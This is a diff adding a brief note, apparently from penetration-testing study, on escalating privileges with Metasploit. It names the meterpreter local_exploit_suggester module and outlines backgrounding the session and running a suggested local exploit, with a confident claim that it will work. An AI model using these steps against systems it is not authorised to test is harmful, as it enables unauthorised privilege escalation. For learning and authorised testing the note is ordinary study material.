@@ -1,0 +1,14 @@
+
+Escalation using Metasploit : 
+
+meterpreter > run post/multi/recon/local_exploit_suggester
+meterpreter > background 
+ 
+now use the exploit that is being displayed by the first command (suggester)
+
+msf5 exploit(multi/handler) > use exploit 1,2,3,4,.....
+set the session 
+exploit !!! 
+
+This method will work and elevate our privileges 
+
